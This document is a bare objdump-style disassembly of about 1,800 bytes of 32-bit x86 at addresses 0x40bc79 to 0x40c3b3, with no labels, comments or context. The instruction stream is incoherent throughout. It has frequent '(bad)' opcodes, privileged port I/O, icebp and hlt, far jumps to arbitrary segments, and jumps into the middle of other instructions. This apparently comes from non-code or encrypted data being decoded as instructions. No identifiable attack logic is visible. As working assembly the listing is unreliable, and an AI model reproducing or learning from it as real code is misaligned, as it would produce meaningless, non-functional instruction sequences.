  40bc79:	aad    0x9c
  40bc7b:	stos   BYTE PTR es:[edi],al
  40bc7c:	aam    0x8e
  40bc7e:	(bad)  
  40bc7f:	mov    BYTE PTR [edi+ecx*8+0x33b20192],dh
  40bc86:	cmp    eax,0x842e0d2a
  40bc8b:	icebp  
  40bc8c:	test   DWORD PTR [edi-0x3a],edx
  40bc8f:	out    0xca,al
  40bc91:	jl     0x40bc5b
  40bc93:	inc    ebx
  40bc94:	cmp    DWORD PTR ds:0x2d156d74,ebx
  40bc9a:	js     0x40bc8f
  40bc9c:	cld    
  40bc9d:	in     al,dx
  40bc9e:	adc    BYTE PTR [edi],0x5c
  40bca1:	lods   al,BYTE PTR ds:[esi]
  40bca2:	ss pop eax
  40bca4:	aaa    
  40bca5:	inc    esp
  40bca6:	loopne 0x40bcaa
  40bca8:	adc    BYTE PTR ss:[ebx],bh
  40bcab:	push   0x30
  40bcad:	shr    DWORD PTR [esi-0xa],0x5c
  40bcb1:	dec    esi
  40bcb2:	pop    ebx
  40bcb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcb4:	jecxz  0x40bd1c
  40bcb6:	jb     0x40bd1e
  40bcb8:	mov    bh,0xdd
  40bcba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcbb:	mov    ebx,0x9249f867
  40bcc0:	pop    ecx
  40bcc1:	mov    eax,DWORD PTR [ecx+0x42]
  40bcc4:	xor    esi,DWORD PTR [si+0x780b]
  40bcc9:	pop    esp
  40bcca:	or     al,0x36
  40bccc:	fcomi  st,st(1)
  40bcce:	mov    WORD PTR ds:0x80daa864,?
  40bcd4:	outs   dx,BYTE PTR ds:[esi]
  40bcd5:	shr    DWORD PTR ds:[ecx+0x11bc68d4],0x43
  40bcdd:	enter  0x65d8,0x7c
  40bce1:	leave  
  40bce2:	nop
  40bce3:	ret    0x608e
  40bce6:	int    0x41
  40bce8:	push   edx
  40bce9:	test   DWORD PTR [eax],esi
  40bceb:	aam    0x72
  40bced:	inc    ebx
  40bcee:	cmc    
  40bcef:	dec    ebp
  40bcf0:	and    ebx,edi
  40bcf2:	sbb    esp,ecx
  40bcf4:	pop    ebx
  40bcf5:	add    al,0x5
  40bcf7:	fdivr  st(1),st
  40bcf9:	hlt    
  40bcfa:	add    BYTE PTR [edi-0x2d],0x12
  40bcfe:	mov    cl,0x67
  40bd00:	sbb    ch,BYTE PTR [edi-0x75]
  40bd03:	in     eax,0xc8
  40bd05:	pop    edx
  40bd06:	call   0x363a9312
  40bd0b:	push   ss
  40bd0c:	daa    
  40bd0d:	(bad)  
  40bd0e:	mov    esp,0x5f38e34c
  40bd13:	dec    ebx
  40bd14:	pop    ebx
  40bd15:	or     DWORD PTR [ecx],edi
  40bd17:	test   DWORD PTR [ecx+eax*4-0x51],esp
  40bd1b:	(bad)  
  40bd1d:	lods   eax,DWORD PTR ds:[esi]
  40bd1e:	sub    DWORD PTR [ebp+0x4e],0xf26536f7
  40bd25:	and    ebp,edi
  40bd27:	inc    ecx
  40bd28:	mov    esi,0xb7e91b2d
  40bd2d:	scas   al,BYTE PTR es:[edi]
  40bd2e:	jmp    0x40bd0b
  40bd30:	and    DWORD PTR [edi+0x4f],eax
  40bd33:	add    bl,BYTE PTR [esp+esi*2+0x7b193520]
  40bd3a:	popf   
  40bd3b:	call   0x8e18:0x81947afd
  40bd42:	bnd jge 0x40bd94
  40bd45:	fsubrp st(0),st
  40bd47:	int3   
  40bd48:	aam    0x92
  40bd4a:	sbb    ebx,DWORD PTR [edi+0x31]
  40bd4d:	popf   
  40bd4e:	daa    
  40bd4f:	inc    edi
  40bd50:	lds    ebp,FWORD PTR [edi-0x1e7381e0]
  40bd56:	icebp  
  40bd57:	fisttp DWORD PTR [ebx-0x19]
  40bd5a:	sbb    ch,BYTE PTR [ebx+0x5209aecd]
  40bd60:	stc    
  40bd61:	dec    esp
  40bd62:	adc    al,0x2e
  40bd64:	push   esp
  40bd65:	(bad)  
  40bd66:	sbb    al,0xbf
  40bd68:	sti    
  40bd69:	je     0x40bd51
  40bd6b:	cmp    eax,0x2b25f98e
  40bd70:	jmp    0x40bd5e
  40bd72:	cmp    bh,al
  40bd74:	mov    ebx,0x8a7964db
  40bd79:	mov    ds:0x6af67c8a,al
  40bd7e:	leave  
  40bd7f:	fs sahf 
  40bd81:	sbb    BYTE PTR [ecx+0x69b8797],dh
  40bd87:	xlat   BYTE PTR ds:[ebx]
  40bd88:	and    edx,edi
  40bd8a:	ins    BYTE PTR es:[edi],dx
  40bd8b:	leave  
  40bd8c:	dec    esi
  40bd8d:	push   ecx
  40bd8e:	js     0x40bdd8
  40bd90:	stc    
  40bd91:	aas    
  40bd92:	mov    ebx,0xaf3bd097
  40bd97:	retf   
  40bd98:	jno    0x40bdfe
  40bd9a:	pop    ebp
  40bd9b:	jns    0x40bdff
  40bd9d:	std    
  40bd9e:	stos   BYTE PTR es:[edi],al
  40bd9f:	std    
  40bda0:	(bad)  
  40bda1:	dec    ebx
  40bda2:	xchg   esi,eax
  40bda3:	cmp    eax,edx
  40bda5:	aad    0x60
  40bda7:	lods   eax,DWORD PTR ds:[esi]
  40bda8:	je     0x40bd93
  40bdaa:	in     eax,0xb1
  40bdac:	push   edx
  40bdad:	mov    edi,ebp
  40bdaf:	(bad)  
  40bdb0:	push   ebp
  40bdb1:	imul   ecx,edi,0x50409c0c
  40bdb7:	loop   0x40bdd6
  40bdb9:	pop    edx
  40bdba:	push   ebx
  40bdbb:	mov    bl,BYTE PTR [eax-0x2bd2ab8]
  40bdc1:	mov    ebp,0x75ed3592
  40bdc6:	sub    eax,0xc0eb15f1
  40bdcb:	jb     0x40bdd7
  40bdcd:	loope  0x40bdfc
  40bdcf:	push   es
  40bdd0:	add    ecx,DWORD PTR [esi]
  40bdd2:	sub    BYTE PTR [bp+si-0x32],cl
  40bdd6:	inc    eax
  40bdd7:	xchg   esi,eax
  40bdd8:	mov    bh,0x2b
  40bdda:	rcr    DWORD PTR [edx+ecx*1],cl
  40bddd:	and    al,0x7f
  40bddf:	ret    
  40bde0:	cmp    BYTE PTR [edx-0x44],bl
  40bde3:	mov    edx,0xb9418aed
  40bde8:	mov    dh,0x41
  40bdea:	inc    ecx
  40bdeb:	dec    eax
  40bdec:	arpl   cx,dx
  40bdee:	dec    edx
  40bdef:	(bad)  
  40bdf1:	ret    
  40bdf2:	jb     0x40bdd7
  40bdf4:	push   0x72
  40bdf6:	ret    0xf052
  40bdf9:	lock adc al,0x5d
  40bdfc:	lock pop ebx
  40bdfe:	jae    0x40be2a
  40be00:	sub    edi,DWORD PTR [ecx]
  40be02:	or     dh,ch
  40be04:	push   edx
  40be05:	out    0x7f,eax
  40be07:	hlt    
  40be08:	fwait
  40be09:	ror    DWORD PTR cs:[esi+0x4f],cl
  40be0d:	es push es
  40be0f:	add    eax,0x2b8752ae
  40be14:	gs xor ah,dl
  40be17:	jmp    0x40bddd
  40be19:	add    DWORD PTR [edi-0x17f5868c],esi
  40be1f:	jl     0x40bdb2
  40be21:	inc    ebp
  40be22:	jle    0x40be92
  40be24:	mov    al,ds:0x47de0cb6
  40be29:	xchg   esi,eax
  40be2a:	xor    ebx,ebx
  40be2c:	gs or  al,0x8e
  40be2f:	pop    esp
  40be30:	sub    al,0x95
  40be32:	aaa    
  40be33:	in     eax,0x38
  40be35:	xchg   edx,eax
  40be36:	xchg   BYTE PTR [ebx+0x17],bh
  40be39:	cdq    
  40be3a:	iret   
  40be3b:	cmp    esp,DWORD PTR [edi]
  40be3d:	clc    
  40be3e:	inc    ebx
  40be3f:	or     eax,0x6c914938
  40be44:	dec    ecx
  40be45:	daa    
  40be46:	inc    esi
  40be47:	mov    ds,WORD PTR [esi+0x2048755c]
  40be4d:	outs   dx,DWORD PTR ds:[esi]
  40be4e:	loope  0x40be01
  40be50:	scas   eax,DWORD PTR es:[edi]
  40be51:	inc    edx
  40be52:	outs   dx,DWORD PTR ds:[esi]
  40be53:	repnz sbb BYTE PTR [ebx*2+0x1829be52],0x1d
  40be5c:	pop    esi
  40be5d:	imul   BYTE PTR [eax]
  40be5f:	clc    
  40be60:	push   ss
  40be61:	jne    0x40bdf3
  40be63:	push   ebx
  40be64:	push   es
  40be65:	push   esp
  40be66:	sti    
  40be67:	out    0x1e,eax
  40be69:	pushf  
  40be6a:	int    0x30
  40be6c:	jno    0x40beeb
  40be6e:	mov    cl,0xe9
  40be70:	test   DWORD PTR [ecx+esi*4-0xe],ebp
  40be74:	stos   DWORD PTR es:[edi],eax
  40be75:	push   esi
  40be76:	push   ds
  40be77:	and    dh,BYTE PTR [edx-0x18]
  40be7a:	bound  edi,QWORD PTR [esi-0x7d]
  40be7d:	sub    bl,BYTE PTR [eax]
  40be7f:	or     cl,BYTE PTR [esi+eax*4]
  40be82:	or     eax,0xd4d9bd69
  40be87:	cmp    DWORD PTR [esi-0x6c],eax
  40be8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be8b:	lods   eax,DWORD PTR ds:[esi]
  40be8c:	repz (bad) 
  40be8e:	mov    bh,0x6f
  40be90:	rol    BYTE PTR [esi],cl
  40be92:	test   eax,0x4f24d209
  40be97:	inc    ecx
  40be98:	sub    ah,BYTE PTR [esi+0x23]
  40be9b:	dec    edi
  40be9c:	ds pop eax
  40be9e:	dec    eax
  40be9f:	js     0x40be90
  40bea1:	in     al,0x74
  40bea3:	inc    ebp
  40bea4:	cdq    
  40bea5:	out    dx,al
  40bea6:	stos   DWORD PTR es:[edi],eax
  40bea7:	aaa    
  40bea8:	daa    
  40bea9:	js     0x40be87
  40beab:	fs pop ds
  40bead:	lock jnp 0x40be56
  40beb0:	push   esi
  40beb1:	jge    0x40be3c
  40beb3:	and    ebp,eax
  40beb5:	mov    eax,0x30db55c9
  40beba:	sbb    dl,ch
  40bebc:	arpl   WORD PTR [ebx],bx
  40bebe:	icebp  
  40bebf:	outs   dx,BYTE PTR ds:[esi]
  40bec0:	pop    esp
  40bec1:	jl     0x40be9c
  40bec3:	enter  0x5b59,0xca
  40bec7:	mov    BYTE PTR [edi+0x28],dh
  40beca:	add    esp,ebx
  40becc:	and    BYTE PTR [edi+0x76],0x77
  40bed0:	fnsave [edx-0x3e226bb5]
  40bed6:	push   eax
  40bed7:	xchg   BYTE PTR [eax-0x74bbbbf9],ah
  40bedd:	cwde   
  40bede:	push   esp
  40bedf:	out    dx,al
  40bee0:	loopne 0x40beb2
  40bee2:	mov    cl,0xbb
  40bee4:	adc    esi,ecx
  40bee6:	loope  0x40bf11
  40bee8:	and    BYTE PTR [edi+eiz*4+0x4644b66a],dl
  40beef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef0:	inc    BYTE PTR [eax+0x5089870c]
  40bef6:	fst    QWORD PTR ds:0xa4923aad
  40befc:	pop    es
  40befd:	and    ecx,DWORD PTR [eax+0x7]
  40bf00:	jo     0x40bf3a
  40bf02:	sub    al,0x63
  40bf04:	retf   0xd023
  40bf07:	and    ch,al
  40bf09:	loop   0x40bf35
  40bf0b:	hlt    
  40bf0c:	mov    ebx,edi
  40bf0e:	fidivr WORD PTR [ecx+0x1bc6026b]
  40bf14:	and    al,0xa7
  40bf16:	cdq    
  40bf17:	enter  0xff2b,0xc0
  40bf1b:	mov    dh,0x2b
  40bf1d:	jg     0x40beec
  40bf1f:	jle    0x40bef8
  40bf21:	stc    
  40bf22:	cmp    DWORD PTR [ebx-0xc],ecx
  40bf25:	mov    al,es:0x31fac34b
  40bf2b:	int3   
  40bf2c:	test   eax,0x5d902500
  40bf31:	jns    0x40bf09
  40bf33:	xlat   BYTE PTR ds:[ebx]
  40bf34:	xchg   ebx,eax
  40bf35:	mov    bh,0x3
  40bf37:	jg     0x40bf7b
  40bf39:	aam    0x92
  40bf3b:	xchg   DWORD PTR ds:0x118ca57a,ecx
  40bf41:	inc    esi
  40bf42:	daa    
  40bf43:	mov    ds:0xda56c77b,eax
  40bf48:	stc    
  40bf49:	int    0x45
  40bf4b:	inc    edi
  40bf4c:	sbb    eax,0x8e1acda0
  40bf51:	xchg   esp,eax
  40bf52:	jno    0x40bf91
  40bf54:	mov    al,0x44
  40bf56:	(bad)  
  40bf57:	es in  al,dx
  40bf59:	mov    BYTE PTR [esi-0x6c],al
  40bf5c:	scas   eax,DWORD PTR es:[edi]
  40bf5d:	and    al,0x4c
  40bf5f:	fiadd  DWORD PTR [esi]
  40bf61:	or     dl,bh
  40bf63:	jo     0x40bf68
  40bf65:	xchg   ebx,eax
  40bf66:	dec    edi
  40bf67:	mov    WORD PTR [edx],fs
  40bf69:	mov    si,0xdb12
  40bf6d:	and    BYTE PTR [esi],bh
  40bf6f:	enter  0x8ce1,0xfb
  40bf73:	into   
  40bf74:	(bad)  
  40bf75:	sbb    eax,0x894deee9
  40bf7a:	pop    esi
  40bf7b:	cdq    
  40bf7c:	aas    
  40bf7d:	pop    eax
  40bf7e:	sub    edi,ebp
  40bf80:	lods   al,BYTE PTR ds:[esi]
  40bf81:	aas    
  40bf82:	cmp    dh,BYTE PTR [esp+eiz*8-0x516a545c]
  40bf89:	sbb    bh,dl
  40bf8b:	addr16 pop ecx
  40bf8d:	mov    bl,0x56
  40bf8f:	add    eax,DWORD PTR [ecx-0x252fa63d]
  40bf95:	je     0x40bfef
  40bf97:	mov    al,ds:0x4ede38ff
  40bf9c:	aas    
  40bf9d:	xchg   edx,eax
  40bf9e:	push   edx
  40bf9f:	jbe    0x40bfb9
  40bfa1:	push   ds
  40bfa2:	xor    BYTE PTR [edx],cl
  40bfa4:	das    
  40bfa5:	dec    esi
  40bfa6:	inc    ebx
  40bfa7:	xchg   ebp,eax
  40bfa8:	rcr    al,cl
  40bfaa:	repnz sub DWORD PTR [eax-0x3f],eax
  40bfae:	sub    dh,BYTE PTR ds:0x4ea20ec1
  40bfb4:	adc    DWORD PTR [edx-0x4c5021b7],0xabc80348
  40bfbe:	push   esi
  40bfbf:	in     eax,0x4f
  40bfc1:	stos   BYTE PTR es:[edi],al
  40bfc2:	pusha  
  40bfc3:	mov    ebx,0x9f7c9cca
  40bfc8:	and    DWORD PTR [ecx-0x5dc1d74b],esp
  40bfce:	cmp    BYTE PTR [ecx],ah
  40bfd0:	jp     0x40bfe0
  40bfd2:	(bad)  
  40bfd3:	mov    cl,0x87
  40bfd5:	inc    edx
  40bfd6:	stos   DWORD PTR es:[edi],eax
  40bfd7:	gs mov ch,0x64
  40bfda:	or     DWORD PTR [eax],ebx
  40bfdc:	push   ebx
  40bfdd:	push   ecx
  40bfde:	dec    esi
  40bfdf:	jns    0x40c03c
  40bfe1:	(bad)  
  40bfe2:	jns    0x40bf91
  40bfe4:	mov    bh,BYTE PTR [esp+ecx*2+0x7898768b]
  40bfeb:	rcr    BYTE PTR [ecx+ebp*2+0x6b1b4d86],1
  40bff2:	(bad)  
  40bff3:	in     al,0xca
  40bff5:	jecxz  0x40c014
  40bff7:	xchg   DWORD PTR [eax+0x1882415],esi
  40bffd:	xrelease xchg DWORD PTR [ebp+0x70],ebx
  40c001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c002:	dec    ebp
  40c003:	into   
  40c004:	cmp    al,0x9d
  40c006:	and    dl,al
  40c008:	push   0x12d55262
  40c00d:	pusha  
  40c00e:	push   edi
  40c00f:	(bad)  
  40c011:	rol    BYTE PTR [eax+0x53970b32],0xfe
  40c018:	fwait
  40c019:	scas   eax,DWORD PTR es:[edi]
  40c01a:	or     al,ch
  40c01c:	les    esp,FWORD PTR [eax-0x7e]
  40c01f:	push   0x2cafedda
  40c024:	in     eax,0x8d
  40c026:	pusha  
  40c027:	pop    eax
  40c028:	jg     0x40c068
  40c02a:	mov    eax,0x897722b7
  40c02f:	test   BYTE PTR [ecx+0x4b0038da],bh
  40c035:	mov    ds:0x9823d2,al
  40c03a:	inc    eax
  40c03b:	jp     0x40bfee
  40c03d:	icebp  
  40c03e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c03f:	xchg   ebp,eax
  40c040:	enter  0xab38,0xf7
  40c044:	lods   al,BYTE PTR ds:[esi]
  40c045:	mov    cl,0x65
  40c047:	mov    ebp,0x79c89797
  40c04c:	xchg   cl,al
  40c04e:	push   edx
  40c04f:	pop    ss
  40c050:	rol    DWORD PTR [ebx+0x14066f5],0x99
  40c057:	sbb    eax,0x632c2c1
  40c05c:	dec    ebp
  40c05d:	add    eax,0xe61ea08
  40c062:	fs sub ch,0x9a
  40c066:	in     eax,0x6a
  40c068:	cld    
  40c069:	push   edi
  40c06a:	xor    al,0xe1
  40c06c:	and    DWORD PTR [ebx+0x43],esp
  40c06f:	mov    bh,0x85
  40c071:	test   al,0xd8
  40c073:	repz xor dl,BYTE PTR cs:[ebp-0x5c8f472e]
  40c07b:	(bad)  
  40c07c:	push   0x7c123c1f
  40c081:	popf   
  40c082:	bound  edx,QWORD PTR [eax-0x33f3e162]
  40c088:	adc    eax,0x8f3ab41b
  40c08d:	dec    ebx
  40c08e:	jbe    0x40c01d
  40c090:	jo     0x40c039
  40c092:	sbb    al,0xc0
  40c094:	cmp    eax,0xcd2aaaac
  40c099:	sub    al,0x91
  40c09b:	lea    eax,[eax+0x5b]
  40c09e:	ror    ebx,1
  40c0a0:	adc    al,0x91
  40c0a2:	push   0xffffffc0
  40c0a4:	inc    esi
  40c0a5:	and    eax,0x8be1dfa4
  40c0aa:	sub    cl,BYTE PTR [edi+eax*2-0x6ff7f9d8]
  40c0b1:	pop    esp
  40c0b2:	cmp    cl,BYTE PTR [edi-0x49]
  40c0b5:	pop    ds
  40c0b6:	jbe    0x40c069
  40c0b8:	or     edi,DWORD PTR [esp+ebp*4-0xf09bbaf]
  40c0bf:	push   ds
  40c0c0:	xor    eax,0x15b4f01b
  40c0c5:	jmp    0xfee6:0xba2fc194
  40c0cc:	test   al,0x5b
  40c0ce:	mov    ebx,0xcaf2b654
  40c0d3:	in     eax,0xbc
  40c0d5:	lea    edx,[ecx+eax*4-0x2ac8141e]
  40c0dc:	mov    ecx,0x47a3bad4
  40c0e1:	addr16 daa 
  40c0e3:	mov    ds:0x36c8b394,al
  40c0e8:	sub    cl,BYTE PTR [esi-0x7e]
  40c0eb:	sbb    ebx,DWORD PTR [edx]
  40c0ed:	js     0x40c117
  40c0ef:	(bad)  
  40c0f0:	inc    edi
  40c0f1:	and    BYTE PTR [ecx-0x6a],bl
  40c0f4:	mov    al,ds:0x302aeac3
  40c0f9:	pop    edi
  40c0fa:	rcl    DWORD PTR [ecx-0x19],0x83
  40c0fe:	es pop esi
  40c100:	stos   DWORD PTR es:[edi],eax
  40c101:	push   esp
  40c102:	pop    edx
  40c103:	mov    bl,0x56
  40c105:	ds ds sar ebp,1
  40c109:	mov    edi,0x8f0ec28d
  40c10e:	pop    eax
  40c10f:	fwait
  40c110:	xchg   edx,eax
  40c111:	mov    ah,BYTE PTR ds:0x3fb1b8f8
  40c117:	xor    cl,dl
  40c119:	gs mov edx,0x24e206dc
  40c11f:	ror    cl,1
  40c121:	xchg   ecx,eax
  40c122:	fadd   DWORD PTR [ebx]
  40c124:	mov    cl,bh
  40c126:	in     al,0x3b
  40c128:	pushf  
  40c129:	sub    al,0x25
  40c12b:	xlat   BYTE PTR ds:[ebx]
  40c12c:	imul   ebx,DWORD PTR [ecx+0x7a],0xffffffc8
  40c130:	xchg   ecx,eax
  40c131:	jmp    0x40c12c
  40c133:	jmp    0x261:0xbb35c8a0
  40c13a:	mov    esp,DWORD PTR [esi+0x79]
  40c13d:	push   edi
  40c13e:	xchg   ebp,eax
  40c13f:	push   edi
  40c140:	pop    esi
  40c141:	je     0x40c14a
  40c143:	sbb    bh,BYTE PTR [ebx]
  40c145:	ret    
  40c146:	cmc    
  40c147:	inc    ebp
  40c148:	jo     0x40c191
  40c14a:	push   ds
  40c14b:	jae    0x40c111
  40c14d:	(bad)  
  40c14e:	sub    ch,cl
  40c150:	or     dh,BYTE PTR [eax+0x2644aa57]
  40c156:	cld    
  40c157:	mov    al,0xee
  40c159:	shl    BYTE PTR [edi+0x79],1
  40c15c:	in     al,dx
  40c15d:	bound  esp,QWORD PTR [ecx-0x3e]
  40c160:	or     DWORD PTR [edx-0x36654472],edi
  40c166:	cmp    dl,BYTE PTR [edx]
  40c168:	es pushf 
  40c16a:	jb     0x40c10f
  40c16c:	mov    al,ds:0xfff82a8e
  40c171:	test   BYTE PTR [esi],bl
  40c173:	ficom  WORD PTR [esi+0x56]
  40c176:	cs ja  0x40c19f
  40c179:	pusha  
  40c17a:	push   esp
  40c17b:	out    0x5e,al
  40c17d:	aaa    
  40c17e:	out    dx,eax
  40c17f:	inc    ebx
  40c180:	mov    dl,0x8b
  40c182:	sbb    ecx,esp
  40c184:	xchg   ebx,eax
  40c185:	lahf   
  40c186:	cmc    
  40c187:	pushf  
  40c188:	(bad)  [ebp*1+0x287f113a]
  40c18f:	mov    ah,0x10
  40c191:	dec    ecx
  40c192:	lods   al,BYTE PTR ds:[esi]
  40c193:	mov    esi,0x1b7a1af9
  40c198:	outs   dx,BYTE PTR ds:[esi]
  40c199:	mov    ds:0x37d1b657,eax
  40c19e:	cli    
  40c19f:	push   ss
  40c1a0:	adc    ebp,esp
  40c1a2:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1a4:	fsub   st,st(1)
  40c1a6:	dec    edi
  40c1a7:	scas   eax,DWORD PTR es:[edi]
  40c1a8:	push   esp
  40c1a9:	iret   
  40c1aa:	xchg   ecx,eax
  40c1ab:	sbb    DWORD PTR [edi],0xffffffe2
  40c1ae:	mov    al,0x6a
  40c1b0:	cmp    al,0x56
  40c1b2:	ja     0x40c136
  40c1b4:	int3   
  40c1b5:	jle    0x40c1ad
  40c1b7:	or     ecx,esp
  40c1b9:	(bad)  
  40c1ba:	cli    
  40c1bb:	push   ss
  40c1bc:	push   ebp
  40c1bd:	mov    esi,0xeb294d15
  40c1c2:	rcr    DWORD PTR [eax+0x79],0x54
  40c1c6:	jle    0x40c14b
  40c1c8:	hlt    
  40c1c9:	loope  0x40c1f8
  40c1cb:	in     eax,0xa7
  40c1cd:	jl     0x40c1aa
  40c1cf:	push   eax
  40c1d0:	sub    dl,al
  40c1d2:	xor    ah,BYTE PTR [edx]
  40c1d4:	in     al,dx
  40c1d5:	pop    ds
  40c1d6:	adc    al,0xe9
  40c1d8:	ja     0x40c1e0
  40c1da:	cld    
  40c1db:	mov    cl,0x23
  40c1dd:	leave  
  40c1de:	dec    ecx
  40c1df:	dec    edi
  40c1e0:	jne    0x40c1ac
  40c1e2:	test   cl,ch
  40c1e4:	cwde   
  40c1e5:	outs   dx,BYTE PTR ds:[esi]
  40c1e6:	jmp    0x50dcb47f
  40c1eb:	adc    al,0x8f
  40c1ed:	sub    dh,BYTE PTR [ecx+0x3c2fef3c]
  40c1f3:	sub    edx,edi
  40c1f5:	loope  0x40c221
  40c1f7:	jne    0x40c262
  40c1f9:	pusha  
  40c1fa:	call   0x964d:0x1637af58
  40c201:	lods   al,BYTE PTR ds:[esi]
  40c202:	rol    DWORD PTR [eax+edi*1-0x5a],1
  40c206:	cdq    
  40c207:	push   esi
  40c208:	inc    edx
  40c209:	push   ss
  40c20a:	retf   0x67e
  40c20d:	pop    edx
  40c20e:	outs   dx,DWORD PTR ds:[esi]
  40c20f:	xor    eax,0xd035cdd2
  40c214:	add    ecx,DWORD PTR [edi+0x7a5773fd]
  40c21a:	dec    esi
  40c21b:	jp     0x40c1ac
  40c21d:	dec    al
  40c21f:	add    bl,BYTE PTR [edi-0x60]
  40c222:	lock in al,0x30
  40c225:	call   0x68219f7a
  40c22a:	addr16 push ds
  40c22c:	es ret 
  40c22e:	sbb    BYTE PTR [eax-0x15],bl
  40c231:	sahf   
  40c232:	aam    0x8d
  40c234:	stos   DWORD PTR es:[edi],eax
  40c235:	push   esp
  40c236:	dec    eax
  40c237:	pop    edx
  40c238:	adc    eax,0xc9aa61a8
  40c23d:	xchg   edx,edi
  40c23f:	sbb    al,0x95
  40c241:	mov    DWORD PTR [edi],ebx
  40c243:	ds mov bh,0x9e
  40c246:	scas   eax,DWORD PTR es:[edi]
  40c247:	cmp    al,0x80
  40c249:	or     al,0x61
  40c24b:	xchg   esp,eax
  40c24c:	mov    dh,al
  40c24e:	dec    edi
  40c24f:	mov    ds:0x99f282f0,al
  40c254:	fidivr WORD PTR [esi+0x7]
  40c257:	inc    edi
  40c258:	adc    eax,0x4e669fee
  40c25d:	and    DWORD PTR [eax+0x6c],esi
  40c260:	ja     0x40c2cd
  40c262:	sub    dl,BYTE PTR [eax]
  40c264:	jno    0x40c1fe
  40c266:	push   es
  40c267:	imul   esi,DWORD PTR [ecx-0x454343e],0x26
  40c26e:	xlat   BYTE PTR ds:[ebx]
  40c26f:	jmp    0x2e53:0x9a22a1ee
  40c276:	mov    dl,0x78
  40c278:	sbb    dl,BYTE PTR [edx-0x10ab8165]
  40c27e:	adc    eax,0x50b1ca2c
  40c283:	test   cl,cl
  40c285:	push   ds
  40c286:	sbb    cl,bl
  40c288:	pop    eax
  40c289:	sbb    bh,BYTE PTR [ebp+0x7d]
  40c28c:	sub    al,0x34
  40c28e:	pop    esi
  40c28f:	lock or eax,edx
  40c292:	(bad)  
  40c293:	sub    bh,BYTE PTR [edx+0xe]
  40c296:	sbb    DWORD PTR [eax+ebx*2],ebx
  40c299:	es aam 0x74
  40c29c:	pop    eax
  40c29d:	shl    DWORD PTR [edi+0x7d],1
  40c2a0:	mov    WORD PTR [edi],ds
  40c2a2:	das    
  40c2a3:	shl    BYTE PTR [esi],1
  40c2a5:	sbb    BYTE PTR [edi-0x42821e1b],ch
  40c2ab:	lods   al,BYTE PTR ds:[esi]
  40c2ac:	fistp  WORD PTR [esi]
  40c2ae:	jge    0x40c2d8
  40c2b0:	xchg   edx,eax
  40c2b1:	push   ss
  40c2b2:	jle    0x40c2ed
  40c2b4:	mov    bh,0x7d
  40c2b6:	add    BYTE PTR [edi+eax*1+0x278e45f5],dh
  40c2bd:	xchg   edi,eax
  40c2be:	xor    eax,0xae82823e
  40c2c3:	loop   0x40c254
  40c2c5:	sbb    bh,BYTE PTR [edi+0x52]
  40c2c8:	retf   0x625e
  40c2cb:	sar    BYTE PTR [edi+0x28],0xf1
  40c2cf:	mov    dh,0x99
  40c2d1:	dec    edx
  40c2d2:	in     eax,dx
  40c2d3:	sub    DWORD PTR [ebp+0x6a91a786],0xa080a66d
  40c2dd:	push   esp
  40c2de:	in     al,0x37
  40c2e0:	mov    edi,0x165d7726
  40c2e5:	aaa    
  40c2e6:	(bad)  
  40c2e7:	in     eax,dx
  40c2e8:	jne    0x40c321
  40c2ea:	fwait
  40c2eb:	aad    0x82
  40c2ed:	lahf   
  40c2ee:	or     bl,BYTE PTR [edi+0x15f1a7d6]
  40c2f4:	cld    
  40c2f5:	dec    edi
  40c2f6:	pop    eax
  40c2f7:	pop    ebp
  40c2f8:	mov    ebx,0x137d3cf7
  40c2fd:	lods   eax,DWORD PTR ds:[esi]
  40c2fe:	ins    DWORD PTR es:[edi],dx
  40c2ff:	push   esp
  40c300:	xchg   BYTE PTR [edi],al
  40c302:	arpl   WORD PTR [edi+esi*4+0x51bff39],si
  40c309:	jnp    0x40c290
  40c30b:	ds push edi
  40c30d:	mov    al,0xd5
  40c30f:	shl    bh,1
  40c311:	mov    gs,WORD PTR ds:0x7ad59a
  40c317:	xor    eax,0xe3a6031f
  40c31c:	(bad)  
  40c31d:	push   cs
  40c31e:	repz inc eax
  40c320:	into   
  40c321:	pop    es
  40c322:	loopne 0x40c328
  40c324:	cld    
  40c325:	scas   eax,DWORD PTR es:[edi]
  40c326:	xor    eax,0x4f1e567f
  40c32b:	or     BYTE PTR [edi],ah
  40c32d:	cmc    
  40c32e:	cdq    
  40c32f:	xor    al,0xf3
  40c331:	int    0xe7
  40c333:	ja     0x40c37b
  40c335:	adc    al,0x2b
  40c337:	mov    esp,0xdfd0053f
  40c33c:	push   esp
  40c33d:	lock mov ebp,0x3ce74568
  40c343:	shl    DWORD PTR [esi+0x7c1c4646],1
  40c349:	in     eax,0x88
  40c34b:	bound  eax,QWORD PTR [ecx+0x3a]
  40c34e:	mov    esp,0x32bc89fe
  40c353:	lods   al,BYTE PTR ds:[esi]
  40c354:	or     al,0xdb
  40c356:	dec    ebx
  40c357:	or     al,0xcf
  40c359:	cmp    DWORD PTR [eax+0x16b00998],esi
  40c35f:	and    DWORD PTR [ebx-0x5bc9a110],edi
  40c365:	add    al,dh
  40c367:	pop    ss
  40c368:	dec    edi
  40c369:	aaa    
  40c36a:	sahf   
  40c36b:	push   0xffffffcb
  40c36d:	sbb    ebp,DWORD PTR [ecx]
  40c36f:	jne    0x40c398
  40c371:	out    0x62,al
  40c373:	xor    eax,DWORD PTR gs:0x5fdf8b6b
  40c37a:	and    dh,BYTE PTR [ebx]
  40c37c:	mov    eax,ds:0xc44fa01d
  40c381:	adc    ecx,ebp
  40c383:	stos   DWORD PTR es:[edi],eax
  40c384:	ret    
  40c385:	mov    dl,BYTE PTR [eax-0x5f3bb2e2]
  40c38b:	ret    0x125d
  40c38e:	mov    cl,0xf8
  40c390:	inc    ecx
  40c391:	add    DWORD PTR [ebp+0x13],edi
  40c394:	loope  0x40c37f
  40c396:	sub    ah,ah
  40c398:	daa    
  40c399:	gs dec ebp
  40c39b:	dec    esi
  40c39c:	pusha  
  40c39d:	outs   dx,DWORD PTR ds:[esi]
  40c39e:	and    BYTE PTR [edx-0x347ee0ff],ch
  40c3a4:	push   es
  40c3a5:	jns    0x40c38e
  40c3a7:	retf   0x7a33
  40c3aa:	lock sbb al,0x1b
  40c3ad:	les    edx,FWORD PTR [eax+0x5de2a95d]
  40c3b3:	ds nop
